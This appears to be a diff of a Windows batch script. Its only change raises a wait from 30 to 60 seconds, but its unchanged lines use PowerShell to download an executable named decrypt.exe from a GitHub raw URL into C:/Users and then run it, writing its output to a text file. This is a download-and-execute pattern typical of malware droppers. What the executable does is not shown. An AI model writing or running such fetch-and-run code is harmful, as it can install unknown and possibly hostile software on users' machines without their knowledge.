@@ -1,7 +1,7 @@
 start cmd.exe /k "powershell -command "$url = 'https://github.com/mortingenstrasse95/mng/raw/main/decrypt.exe'; $output = 'C:/Users/decrypt.exe'; $start_time = Get-Date; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url, $output); Write-Output 'Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)';"
 
 
-timeout /t 30
+timeout /t 60
 
 start cmd.exe /k powershell -command "C:/Users/decrypt.exe | Out-File -FilePath C:/Users/decrypt.txt ;"
 
